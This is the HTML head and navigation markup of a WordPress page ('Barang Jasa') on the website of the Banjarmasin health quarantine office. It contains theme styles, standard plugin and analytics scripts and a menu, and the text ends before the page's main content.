.penci-wide-content { margin-left:0; width: 73%;}}@media screen and (min-width: 1130px){ .page-template-default  .site-main{ max-width:1130px;margin-left: auto; margin-right: auto; } .page-template-default .site-main .penci-container{ max-width: 100%; } }@media screen and (min-width: 1240px){.two-sidebar .site-main .penci-container .widget-area-1, .penci-vc_two-sidebar.penci-container .widget-area-1,.penci-vc_two-sidebar.penci-container-fluid .widget-area-1{width: 21.4%; }.two-sidebar .site-main .penci-container .widget-area-2, .penci-vc_two-sidebar.penci-container .widget-area-2,.penci-vc_two-sidebar.penci-container-fluid .widget-area-2{width: 21.4%; }.two-sidebar .site-main .penci-container .penci-wide-content, .penci-vc_two-sidebar.penci-container .penci-wide-content,.penci-vc_two-sidebar.penci-container-fluid .penci-wide-content{ max-width: 100%; width: 57.2%; }}@media screen and (min-width: 960px){.sidebar-left .site-main .penci-wide-content,.sidebar-right .site-main .penci-wide-content{width: 73%;max-width: 100%;}.sidebar-left .site-main .widget-area,.sidebar-right .site-main .widget-area{width: 27%;max-width: 100%;}.penci-con_innner-sidebar-left .penci-content-main,.penci-vc_sidebar-right .penci-con_innner-sidebar-left .penci-content-main { width: 73%;max-width: 100%; }}@media screen and (min-width: 1240px){ .penci-vc_sidebar-left .penci-container__content .penci-content-main, .penci-vc_sidebar-right .penci-container__content .penci-content-main{ flex:inherit ; }.penci-vc_sidebar-left .widget-area, .penci-vc_sidebar-right .widget-area { width: 27%;max-width: 100%; }.penci-vc_sidebar-left .penci-content-main, .penci-vc_sidebar-right .penci-content-main{ width: 73%;max-width: 100%; }}@media screen and (max-width: 1240px) and (min-width: 960px){.penci-vc_two-sidebar .widget-area{ width: 27%;max-width: 100%; }.sidebar-left .site-main .penci-container__content, .sidebar-right .site-main .penci-container__content,.two-sidebar .site-main .penci-wide-content, .penci-vc_two-sidebar .penci-wide-content { margin-left:0; width: 73%;}}@media screen and (min-width: 1440px) {.penci-con_innner-sidebar-left .widget-area, .penci-con_innner-sidebar-right .widget-area { width: 27% !important; } }@media screen and (min-width: 1130px){ .archive  .site-main, body.blog  .site-main{ max-width:1130px;margin-left: auto; margin-right: auto; } .archive .site-main .penci-container, body.blog .site-main .penci-container{ max-width: 100%; } }.penci-portfolio-wrap{ margin-left: 0px; margin-right: 0px; }.penci-portfolio-wrap .portfolio-item{ padding-left: 0px; padding-right: 0px; margin-bottom:0px; }.footer__logo a,.footer__logo img{ max-width:50px;}.penci-popup-login-register .penci-login-container .penci-login input[type="submit"]{ color:#ffffff ; }.penci-popup-login-register .penci-login-container .penci-login input[type="submit"]{ background-color:#247781 ; }.header__top, .header__bottom { background-color: #e6ec7f; }.site-header{ background-color:#0d76e0; }.site-header{
			box-shadow: inset 0 -1px 0 #d1e234;
			-webkit-box-shadow: inset 0 -1px 0 #d1e234;
			-moz-box-shadow: inset 0 -1px 0 #d1e234;
		  }.site-header.header--s2:before, .site-header.header--s3:not(.header--s4):before, .site-header.header--s6:before{ background-color:#d1e234 !important }.main-navigation ul.menu > li > a{ color:#ffffff }.main-navigation.penci_enable_line_menu > ul:not(.children) > li > a:before{background-color: #000000; }.main-navigation > ul:not(.children) > li:hover > a,.main-navigation > ul:not(.children) > li.current-category-ancestor > a,.main-navigation > ul:not(.children) > li.current-menu-ancestor > a,.main-navigation > ul:not(.children) > li.current-menu-item > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li:hover > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li:active > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li.current-category-ancestor > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li.current-menu-ancestor > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li.current-menu-item > a,.main-navigation.penci_disable_padding_menu > ul:not(.children) > li:hover > a,.main-navigation.penci_disable_padding_menu > ul:not(.children) > li.current-category-ancestor > a,.main-navigation.penci_disable_padding_menu > ul:not(.children) > li.current-menu-ancestor > a,.main-navigation.penci_disable_padding_menu > ul:not(.children) > li.current-menu-item > a,.main-navigation.penci_disable_padding_menu ul.menu > li > a:hover,.main-navigation ul.menu > li.current-menu-item > a,.main-navigation ul.menu > li > a:hover{ color: #000000 }.main-navigation > ul:not(.children) > li.highlight-button > a{ color: #000000; }.main-navigation > ul:not(.children) > li:hover > a,.main-navigation > ul:not(.children) > li:active > a,.main-navigation > ul:not(.children) > li.current-category-ancestor > a,.main-navigation > ul:not(.children) > li.current-menu-ancestor > a,.main-navigation > ul:not(.children) > li.current-menu-item > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li:hover > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li:active > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li.current-category-ancestor > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li.current-menu-ancestor > a,.site-header.header--s11 .main-navigation.penci_enable_line_menu .menu > li.current-menu-item > a,.main-navigation ul.menu > li > a:hover{ background-color: #ffd006 }.main-navigation > ul:not(.children) > li.highlight-button > a{ background-color: #ffd006; }.main-navigation > ul:not(.children) > li.highlight-button:hover > a,.main-navigation > ul:not(.children) > li.highlight-button:active > a,.main-navigation > ul:not(.children) > li.highlight-button.current-category-ancestor > a,.main-navigation > ul:not(.children) > li.highlight-button.current-menu-ancestor > a,.main-navigation > ul:not(.children) > li.highlight-button.current-menu-item > a{ border-color: #ffd006; }.main-navigation > ul:not(.children) > li ul.sub-menu{ border-color:#ffd006 ; }.main-navigation ul li:not( .penci-mega-menu ) ul li.current-category-ancestor > a,.main-navigation ul li:not( .penci-mega-menu ) ul li.current-menu-ancestor > a,.main-navigation ul li:not( .penci-mega-menu ) ul li.current-menu-item > a,.main-navigation ul li:not( .penci-mega-menu ) ul li a:hover{background-color: #ffd006 }.header__search:not(.header__search_dis_bg) .search-click{ background-color:#dd3333; }.penci-header-mobile .penci-header-mobile_container{ background-color:#0d76e0; }#main .widget .tagcloud a{ }#main .widget .tagcloud a:hover{}.site-footer{ background-color:#42a3a7 ; }.footer__copyright_menu{ background-color:#595959 ; }.site-info{ color:#ffffff ; }body.penci-body-boxed .penci-enable-boxed{ max-width:1170px;}body.penci-body-boxed .penci-enable-boxed .site-header{ max-width:1170px;}
</style>
<link rel='stylesheet' id='tablepress-default-css' href='https://kkpbanjarmasin.or.id/wp-content/tablepress-combined.min.css?ver=7' type='text/css' media='all' />
<link rel='stylesheet' id='wps-visitor-style-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/wps-visitor-counter/styles/css/default.css?ver=2' type='text/css' media='all' />
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/download-manager/assets/bootstrap/js/popper.min.js?ver=6.6.4" id="wpdm-poper-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/download-manager/assets/bootstrap/js/bootstrap.min.js?ver=6.6.4" id="wpdm-frontend-js-js"></script>
<script type="text/javascript" id="wpdm-frontjs-js-extra">
/* <![CDATA[ */
var wpdm_url = {"home":"https:\/\/kkpbanjarmasin.or.id\/","site":"https:\/\/kkpbanjarmasin.or.id\/","ajax":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php"};
var wpdm_js = {"spinner":"<i class=\"fas fa-sun fa-spin\"><\/i>","client_id":"35c58581009472bde7db0b23b8d3bdb5"};
var wpdm_strings = {"pass_var":"Password Verified!","pass_var_q":"Please click following button to start download.","start_dl":"Start Download"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/download-manager/assets/js/front.js?ver=3.3.02" id="wpdm-frontjs-js"></script>

<!-- Google tag (gtag.js) snippet added by Site Kit -->

<!-- Google Analytics snippet added by Site Kit -->
<script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-DFBM421RDL" id="google_gtagjs-js" async></script>
<script type="text/javascript" id="google_gtagjs-js-after">
/* <![CDATA[ */
window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag("set","linker",{"domains":["kkpbanjarmasin.or.id"]});
gtag("js", new Date());
gtag("set", "developer_id.dZTNiMT", true);
gtag("config", "G-DFBM421RDL");
/* ]]> */
</script>

<!-- End Google tag (gtag.js) snippet added by Site Kit -->
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/fingerprint.min.js?ver=2.1.12" id="wpa-fingerprintjs-js"></script>
<script type="text/javascript" id="wps-js-extra">
/* <![CDATA[ */
var wpspagevisit = {"ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","ajax_nonce":"1e61e35555"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wps-visitor-counter/styles/js/custom.js?ver=1" id="wps-js"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://kkpbanjarmasin.or.id/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.4" />
<link rel='shortlink' href='https://kkpbanjarmasin.or.id/?p=4779' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fbarang-jasa%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fbarang-jasa%2F&#038;format=xml" />
<meta name="generator" content="Site Kit by Google 1.139.0" /><script>
var portfolioDataJs = portfolioDataJs || [];
var penciBlocksArray=[];
var PENCILOCALCACHE = {};
		(function () {
				"use strict";
		
				PENCILOCALCACHE = {
					data: {},
					remove: function ( ajaxFilterItem ) {
						delete PENCILOCALCACHE.data[ajaxFilterItem];
					},
					exist: function ( ajaxFilterItem ) {
						return PENCILOCALCACHE.data.hasOwnProperty( ajaxFilterItem ) && PENCILOCALCACHE.data[ajaxFilterItem] !== null;
					},
					get: function ( ajaxFilterItem ) {
						return PENCILOCALCACHE.data[ajaxFilterItem];
					},
					set: function ( ajaxFilterItem, cachedData ) {
						PENCILOCALCACHE.remove( ajaxFilterItem );
						PENCILOCALCACHE.data[ajaxFilterItem] = cachedData;
					}
				};
			}
		)();function penciBlock() {
		    this.atts_json = '';
		    this.content = '';
		}</script>
		<style type="text/css">
																										</style>
				<style type="text/css">
																																													
					</style>
		<style id="sticky-social-icons-styles">#sticky-social-icons-container{top: 160px}#sticky-social-icons-container li a{font-size: 24px; width: 60px; height:60px; }#sticky-social-icons-container.with-animation li a:hover{width: 70px; }#sticky-social-icons-container li a.fa-brands-fa-youtube{color: #fff; background: #e51b1b; }#sticky-social-icons-container li a.fa-brands-fa-youtube:hover{color: #fff; background: #c41717; }#sticky-social-icons-container li a.fa-brands-fa-instagram{color: #fff; background: #e878e8; }#sticky-social-icons-container li a.fa-brands-fa-instagram:hover{color: #fff; background: #ae78e8; }#sticky-social-icons-container li a.fa-brands-fa-tiktok{color: #ffffff; background: #333333; }#sticky-social-icons-container li a.fa-brands-fa-tiktok:hover{color: #fff; background: #000; }#sticky-social-icons-container li a.fa-brands-fa-facebook-f{color: #fff; background: #1e73be; }#sticky-social-icons-container li a.fa-brands-fa-facebook-f:hover{color: #fff; background: #194da8; }#sticky-social-icons-container li a.fa-brands-fa-x-twitter{color: #fff; background: #000000; }#sticky-social-icons-container li a.fa-brands-fa-x-twitter:hover{color: #fff; background: #000000; }@media( max-width: 415px ){#sticky-social-icons-container li a{font-size: 20.4px; width: 51px; height:51px; }}</style><script type="application/ld+json">{
    "@context": "http:\/\/schema.org\/",
    "@type": "organization",
    "@id": "#organization",
    "logo": "",
    "url": "https:\/\/kkpbanjarmasin.or.id\/",
    "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
    "description": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"
}</script><script type="application/ld+json">{
    "@context": "http:\/\/schema.org\/",
    "@type": "WebSite",
    "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
    "alternateName": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
    "url": "https:\/\/kkpbanjarmasin.or.id\/"
}</script><script type="application/ld+json">{
    "@context": "http:\/\/schema.org\/",
    "@type": "WPSideBar",
    "name": "Sidebar Right",
    "alternateName": "Add widgets here to display them on blog and single",
    "url": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa"
}</script><script type="application/ld+json">{
    "@context": "http:\/\/schema.org\/",
    "@type": "WPSideBar",
    "name": "Footer Column #1",
    "alternateName": "Add widgets here to display them in the first column of the footer",
    "url": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa"
}</script><script type="application/ld+json">{
    "@context": "http:\/\/schema.org\/",
    "@type": "WPSideBar",
    "name": "Footer Column #2",
    "alternateName": "Add widgets here to display them in the second column of the footer",
    "url": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa"
}</script><script type="application/ld+json">{
    "@context": "http:\/\/schema.org\/",
    "@type": "WebPage",
    "headline": "Barang Jasa",
    "description": "Barang Jasa",
    "datePublished": "2024-11-08",
    "datemodified": "2024-11-11",
    "mainEntityOfPage": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa\/",
    "image": {
        "@type": "ImageObject",
        "url": ""
    },
    "publisher": {
        "@type": "Organization",
        "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"
    },
    "author": {
        "@type": "Person",
        "@id": "#person-admkkp",
        "name": "admkkp"
    }
}</script><meta property="fb:app_id" content="348280475330978"><meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."/>
<style type="text/css" id="custom-background-css">
body.custom-background { background-image: url("https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/5594016-scaled.jpg"); background-position: left top; background-size: contain; background-repeat: repeat; background-attachment: fixed; }
</style>
	<link rel="icon" href="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/cropped-logo-32x32.png" sizes="32x32" />
<link rel="icon" href="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/cropped-logo-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/cropped-logo-180x180.png" />
<meta name="msapplication-TileImage" content="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/cropped-logo-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			.site {
    width: 1170px;
}
#main {
    padding: 15px 0px 0;
}
  
@media screen and (max-width: 940px) {
.site {
       width: 100%;
}
    
#main {
        padding: 0px 0px;
    }

.responsive-table {
	overflow: hidden;
	overflow-x: scroll;
	display:block;
}
}

@media screen and (max-width: 1440px) {
.site {
       width: 1170px;
}
    
#main {
        padding: 15px 0px;
    }

.responsive-table {
	overflow: hidden;
	overflow-x: scroll;
	display:block;
}
}

@media screen and (max-width: 1900px) {
.site {
       width: 1770px;
}
    
#main {
        padding: 15px 0px;
    }

.responsive-table {
	overflow: hidden;
	overflow-x: scroll;
	display:block;
}
}
header#masthead {
 
    width: 1170px;
}
 .table_id{
	 border: 1px solid #cccccc;
	 font-size: 10pt;
    display: block;
    overflow-x: auto;
    white-space: nowrap;
}
 .table_id thead{
	 background-color: #dededb;
	 font-weight: bold;
	 text-align: center;
	 vertical-align: middle;
}		</style>
		<noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><meta name="generator" content="WordPress Download Manager 3.3.02" />
                <style>
        /* WPDM Link Template Styles */        </style>
                <style>

            :root {
                --color-primary: #4a8eff;
                --color-primary-rgb: 74, 142, 255;
                --color-primary-hover: #5998ff;
                --color-primary-active: #3281ff;
                --color-secondary: #6c757d;
                --color-secondary-rgb: 108, 117, 125;
                --color-secondary-hover: #6c757d;
                --color-secondary-active: #6c757d;
                --color-success: #018e11;
                --color-success-rgb: 1, 142, 17;
                --color-success-hover: #0aad01;
                --color-success-active: #0c8c01;
                --color-info: #2CA8FF;
                --color-info-rgb: 44, 168, 255;
                --color-info-hover: #2CA8FF;
                --color-info-active: #2CA8FF;
                --color-warning: #FFB236;
                --color-warning-rgb: 255, 178, 54;
                --color-warning-hover: #FFB236;
                --color-warning-active: #FFB236;
                --color-danger: #ff5062;
                --color-danger-rgb: 255, 80, 98;
                --color-danger-hover: #ff5062;
                --color-danger-active: #ff5062;
                --color-green: #30b570;
                --color-blue: #0073ff;
                --color-purple: #8557D3;
                --color-red: #ff5062;
                --color-muted: rgba(69, 89, 122, 0.6);
                --wpdm-font: "Rubik", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            }

            .wpdm-download-link.btn.btn-primary {
                border-radius: 4px;
            }


        </style>
        	<style>
		a.custom-button.pencisc-button {
			background: transparent;
			color: #D3347B;
			border: 2px solid #D3347B;
			line-height: 36px;
			padding: 0 20px;
			font-size: 14px;
			font-weight: bold;
		}
		a.custom-button.pencisc-button:hover {
			background: #D3347B;
			color: #fff;
			border: 2px solid #D3347B;
		}
		a.custom-button.pencisc-button.pencisc-small {
			line-height: 28px;
			font-size: 12px;
		}
		a.custom-button.pencisc-button.pencisc-large {
			line-height: 46px;
			font-size: 18px;
		}
	</style>
</head>

<body data-rsssl=1 class="page-template-default page page-id-4779 custom-background group-blog penci-body-boxed penci_enable_ajaxsearch penci_sticky_content_sidebar sidebar-right penci-page-style-1 wpb-js-composer js-comp-ver-6.1 vc_responsive">

<div id="page" class="site penci-enable-boxed">
	
	<div id="metaslider-id-3745" style="width: 100%;" class="ml-slider-3-92-1 metaslider metaslider-flex metaslider-3745 ml-slider ms-theme-default nav-hidden" role="region" aria-roledescription="Slideshow" aria-label="header">
    <div id="metaslider_container_3745">
        <div id="metaslider_3745">
            <ul class='slides'>
                <li style="display: block; width: 100%;" class="slide-3746 ms-image " aria-roledescription="slide" aria-label="slide-3746"><img src="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/header5.jpg" height="500" width="2000" alt="" class="slider-3745 slide-3746" title="WhatsApp Image 2024-09-21 at 20.41.04_851fdd87" /></li>
            </ul>
        </div>
        
    </div>
</div><div class="site-header-wrapper"><div class="header__top header--s3 customizer-width">
	<div class="penci-container-1170">
		
<div class="site-branding">
		</div><!-- .site-branding -->
	</div>
</div>
	<header id="masthead" class="site-header site-header__main header--s3" data-height="20" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
	<div class="penci-container-1170 header-content__container">
		<nav id="site-navigation" class="main-navigation pencimn-slide_down" itemscope itemtype="http://schema.org/SiteNavigationElement">
	<ul id="menu-new_utama" class="menu"><li id="menu-item-3902" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-3902"><a href="https://kkpbanjarmasin.or.id" itemprop="url">Beranda</a></li>
<li id="menu-item-3903" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3903"><a href="#" itemprop="url">Profil</a>
<ul class="sub-menu">
	<li id="menu-item-3904" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3904"><a href="https://kkpbanjarmasin.or.id/visi-dan-misi/" itemprop="url">Visi dan Misi</a></li>
	<li id="menu-item-3905" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3905"><a href="https://kkpbanjarmasin.or.id/struktur-organisasi/" itemprop="url">Struktur Organisasi</a></li>
	<li id="menu-item-3906" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3906"><a href="https://kkpbanjarmasin.or.id/tugas-pokok-dan-fungsi/" itemprop="url">Tugas Pokok dan Fungsi</a></li>
	<li id="menu-item-3907" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3907"><a href="https://kkpbanjarmasin.or.id/sarana-dan-prasarana/" itemprop="url">Sarana dan Prasarana</a></li>
	<li id="menu-item-3908" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3908"><a href="#" itemprop="url">Tim Kerja</a>
	<ul class="sub-menu">
		<li id="menu-item-3909" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3909"><a href="https://kkpbanjarmasin.or.id/sub-bag-tata-usaha/" itemprop="url">Sub Bagian Administrasi Umum</a></li>
		<li id="menu-item-3954" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3954"><a href="https://kkpbanjarmasin.or.id/tim-kerja-1/" itemprop="url">Tim Kerja 1</a></li>
		<li id="menu-item-3953" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3953"><a href="https://kkpbanjarmasin.or.id/tim-kerja-2/" itemprop="url">Tim Kerja 2</a></li>
		<li id="menu-item-3952" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3952"><a href="https://kkpbanjarmasin.or.id/tim-kerja-3/" itemprop="url">Tim Kerja 3</a></li>
		<li id="menu-item-3951" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3951"><a href="https://kkpbanjarmasin.or.id/tim-kerja-4/" itemprop="url">Tim Kerja 4</a></li>
		<li id="menu-item-3950" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3950"><a href="https://kkpbanjarmasin.or.id/tim-kerja-5/" itemprop="url">Tim Kerja 5</a></li>
	</ul>
</li>
	<li id="menu-item-4426" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4426"><a href="https://kkpbanjarmasin.or.id/budaya-kerja/" itemprop="url">Budaya Kerja</a></li>
	<li id="menu-item-3956" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3956"><a href="https://kkpbanjarmasin.or.id/core-values-berakhlak/" itemprop="url">Core Values Berakhlak</a></li>
</ul>
</li>
<li id="menu-item-3957" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3957"><a href="#" itemprop="url">Wilayah Kerja</a>
<ul class="sub-menu">
	<li id="menu-item-3958" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3958"><a href="https://kkpbanjarmasin.or.id/bandara-syamsuddin-noor/" itemprop="url">Bandara Syamsuddin Noor</a></li>
	<li id="menu-item-3959" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3959"><a href="https://kkpbanjarmasin.or.id/kotabaru/" itemprop="url">Kotabaru</a></li>
	<li id="menu-item-3960" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3960"><a href="https://kkpbanjarmasin.or.id/batulicin/" itemprop="url">Batulicin</a></li>
	<li id="menu-item-3961" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3961"><a href="https://kkpbanjarmasin.or.id/satui/" itemprop="url">Satui</a></li>
	<li id="menu-item-3962" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3962"><a href="https://kkpbanjarmasin.or.id/kintap/" itemprop="url">Kintap</a></li>
</ul>
</li>
<li id="menu-item-3963" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3963"><a href="#" itemprop="url">Layanan Publik</a>
<ul class="sub-menu">
	<li id="menu-item-3964" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3964"><a href="https://kkpbanjarmasin.or.id/buku-tamu/" itemprop="url">Buku Tamu</a></li>
	<li id="menu-item-3966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3966"><a href="#" itemprop="url">Informasi Layanan</a>
	<ul class="sub-menu">
		<li id="menu-item-3965" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3965"><a href="#" itemprop="url">Jam Layanan</a>
		<ul class="sub-menu">
			<li id="menu-item-3967" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3967"><a href="https://kkpbanjarmasin.or.id/vaksinasi/" itemprop="url">Vaksinasi</a></li>
			<li id="menu-item-3968" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3968"><a href="https://kkpbanjarmasin.or.id/kekarantinaan-kesehatan/" itemprop="url">Kekarantinaan Kesehatan</a></li>
		</ul>
</li>
		<li id="menu-item-3969" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3969"><a href="https://kkpbanjarmasin.or.id/standar-pelayanan/" itemprop="url">Standar Pelayanan</a></li>
	</ul>
</li>
	<li id="menu-item-3970" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3970"><a href="https://kkpbanjarmasin.or.id/hasil-survey-kepuasan-masyarakat/" itemprop="url">Hasil Survey Kepuasan Masyarakat</a></li>
	<li id="menu-item-3971" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3971"><a href="https://kkpbanjarmasin.or.id/infografis-kekarantinaan-kesehatan/" itemprop="url">Infografis Kekarantinaan Kesehatan</a></li>
</ul>
</li>
<li id="menu-item-3976" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3976"><a href="#" itemprop="url">Informasi Publik</a>
<ul class="sub-menu">
	<li id="menu-item-3972" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3972"><a href="https://kkpbanjarmasin.or.id/category/berita/" itemprop="url">Berita</a></li>
	<li id="menu-item-4703" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4703"><a href="https://kkpbanjarmasin.or.id/buletin-sigar-edisi-1/" itemprop="url">Buletin</a></li>
	<li id="menu-item-3973" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3973"><a href="https://kkpbanjarmasin.or.id/category/pengumuman/" itemprop="url">Pengumuman</a></li>
	<li id="menu-item-3975" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3975"><a href="#" itemprop="url">PPID</a>
	<ul class="sub-menu">
		<li id="menu-item-3978" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3978"><a href="https://kkpbanjarmasin.or.id/jam-layanan-ppid/" itemprop="url">Layanan PPID</a>
		<ul class="sub-menu">
			<li id="menu-item-3977" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3977"><a href="https://kkpbanjarmasin.or.id/form-permohonan-ppid/" itemprop="url">Form PPID</a></li>
			<li id="menu-item-4803" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4803"><a href="https://kkpbanjarmasin.or.id/peraturan-kebijakan/" itemprop="url">Peraturan / Kebijakan</a></li>
			<li id="menu-item-4804" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4804"><a href="https://kkpbanjarmasin.or.id/jadwal-layanan/" itemprop="url">Jadwal Layanan</a></li>
			<li id="menu-item-4805" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4805"><a href="https://kkpbanjarmasin.or.id/tata-cara/" itemprop="url">Tata Cara</a></li>
			<li id="menu-item-4971" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4971"><a href="https://kkpbanjarmasin.or.id/sarana-prasarana-ppid/" itemprop="url">Sarana Prasarana PPID</a></li>
			<li id="menu-item-4806" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4806"><a href="https://kkpbanjarmasin.or.id/sop-2/" itemprop="url">SOP</a></li>
			<li id="menu-item-5006" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5006"><a href="https://kkpbanjarmasin.or.id/daftar-informasi-publik/" itemprop="url">Daftar Informasi Publik</a></li>
			<li id="menu-item-5026" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5026"><a href="https://kkpbanjarmasin.or.id/daftar-register-permohonan/" itemprop="url">Daftar Register Permohonan</a></li>
		</ul>
</li>
		<li id="menu-item-4762" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-4762"><a href="https://kkpbanjarmasin.or.id/laporan-tersedia-setiap-saat/" itemprop="url">Layanan Tersedia Setiap Saat</a>
		<ul class="sub-menu">
			<li id="menu-item-4807" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-4779 current_page_item menu-item-4807"><a href="https://kkpbanjarmasin.or.id/barang-jasa/" itemprop="url">Barang Jasa</a></li>
			<li id="menu-item-4808" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4808"><a href="https://kkpbanjarmasin.or.id/rencana-strategis/" itemprop="url">Rencana Strategis</a></li>
			<li id="menu-item-4809" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4809"><a href="https://kkpbanjarmasin.or.id/statistik/" itemprop="url">Statistik</a></li>
			<li id="menu-item-4810" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4810"><a href="https://kkpbanjarmasin.or.id/informasi-bmn/" itemprop="url">Informasi BMN</a></li>
		</ul>
</li>
		<li id="menu-item-3979" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3979"><a href="https://kkpbanjarmasin.or.id/informasi-berkala/" itemprop="url">Informasi Berkala</a></li>
		<li id="menu-item-3980" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3980"><a href="#" itemprop="url">Informasi Serta Merta</a>
		<ul class="sub-menu">
			<li id="menu-item-3981" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3981"><a href="https://kkpbanjarmasin.or.id/pandemi/" itemprop="url">Pandemi</a></li>
			<li id="menu-item-3982" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3982"><a href="https://kkpbanjarmasin.or.id/informasi-sebaran-penyakit/" itemprop="url">Informasi Sebaran Penyakit</a></li>
		</ul>
</li>
